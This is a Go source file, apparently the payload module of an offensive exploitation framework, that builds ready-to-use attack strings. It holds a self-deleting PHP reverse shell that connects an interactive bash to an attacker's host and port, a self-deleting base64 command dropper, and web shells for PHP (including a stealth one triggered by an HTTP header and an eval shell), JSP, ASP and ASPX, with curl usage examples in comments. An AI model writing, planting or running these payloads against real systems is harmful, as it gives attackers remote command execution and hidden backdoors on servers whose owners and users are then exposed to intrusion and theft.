package payload

import (
	"encoding/base64"
	"fmt"

	"github.com/Chocapikk/pik/sdk"
)

func init() {
	sdk.SetPHPReverseShell(PHPReverseShellDrop)
	sdk.SetPHPSystem(PHPSystemDrop)
}

// PHPReverseShellDrop returns a self-deleting PHP reverse shell for file drop.
// Uses proc_open with /bin/bash -i for an interactive session.
func PHPReverseShellDrop(lhost string, lport int) string {
	return fmt.Sprintf(
		`<?php unlink(__FILE__);$s=fsockopen("%s",%d);$p=proc_open("/bin/bash -i",array(0=>$s,1=>$s,2=>$s),$pipes); ?>`,
		lhost, lport,
	)
}

// PHPSystemDrop returns a self-deleting PHP system exec for file drop.
// The command is base64-encoded for safe transport.
func PHPSystemDrop(cmd string) string {
	return fmt.Sprintf(`<?php unlink(__FILE__);system(base64_decode("%s")); ?>`,
		base64.StdEncoding.EncodeToString([]byte(cmd)))
}

// PHPWebShell returns a minimal PHP web shell.
// Execute commands via: curl target/shell.php?cmd=id
func PHPWebShell(param string) string {
	if param == "" {
		param = "cmd"
	}
	return fmt.Sprintf(`<?php system($_GET["%s"]); ?>`, param)
}

// PHPWebShellPassthru returns a PHP web shell using passthru for binary output.
func PHPWebShellPassthru(param string) string {
	if param == "" {
		param = "cmd"
	}
	return fmt.Sprintf(`<?php passthru($_GET["%s"]); ?>`, param)
}

// PHPWebShellPost returns a PHP web shell that reads from POST body.
func PHPWebShellPost(param string) string {
	if param == "" {
		param = "cmd"
	}
	return fmt.Sprintf(`<?php if(isset($_POST["%s"])){system($_POST["%s"]);} ?>`, param, param)
}

// PHPWebShellStealth returns a PHP web shell hidden in a header.
// Execute commands via: curl -H "X-Cmd: id" target/shell.php
func PHPWebShellStealth(header string) string {
	if header == "" {
		header = "X-Cmd"
	}
	return fmt.Sprintf(
		`<?php if(isset($_SERVER["HTTP_%s"])){system($_SERVER["HTTP_%s"]);} ?>`,
		phpHeaderKey(header), phpHeaderKey(header),
	)
}

// PHPEval returns a PHP eval shell (POST parameter).
func PHPEval(param string) string {
	if param == "" {
		param = "code"
	}
	return fmt.Sprintf(`<?php eval($_POST["%s"]); ?>`, param)
}

// JSPWebShell returns a minimal JSP web shell.
func JSPWebShell(param string) string {
	if param == "" {
		param = "cmd"
	}
	return fmt.Sprintf(
		`<%% if(request.getParameter("%s")!=null){`+
			`Process p=Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",request.getParameter("%s")});`+
			`java.io.InputStream is=p.getInputStream();`+
			`int c;while((c=is.read())!=-1){out.write(c);}p.waitFor();} %%>`,
		param, param,
	)
}

// ASPWebShell returns a classic ASP web shell.
func ASPWebShell(param string) string {
	if param == "" {
		param = "cmd"
	}
	return fmt.Sprintf(
		`<%%%% Set o=Server.CreateObject("WSCRIPT.SHELL"):Set r=o.Exec("cmd /c "&Request("%s")):Response.Write r.StdOut.ReadAll %%%%>`,
		param,
	)
}

// ASPXWebShell returns an ASPX web shell.
func ASPXWebShell(param string) string {
	if param == "" {
		param = "cmd"
	}
	return fmt.Sprintf(
		`<%% @ Page Language="C#" %%>`+
			`<%% System.Diagnostics.Process p=new System.Diagnostics.Process();`+
			`p.StartInfo.FileName="cmd.exe";`+
			`p.StartInfo.Arguments="/c "+Request["%s"];`+
			`p.StartInfo.RedirectStandardOutput=true;`+
			`p.StartInfo.UseShellExecute=false;`+
			`p.Start();Response.Write(p.StandardOutput.ReadToEnd()); %%>`,
		param,
	)
}

func phpHeaderKey(header string) string {
	// PHP converts headers to HTTP_<UPPERCASE_UNDERSCORED>
	result := make([]byte, 0, len(header))
	for _, c := range header {
		switch {
		case c == '-':
			result = append(result, '_')
		case c >= 'a' && c <= 'z':
			result = append(result, byte(c-32))
		default:
			result = append(result, byte(c))
		}
	}
	return string(result)
}
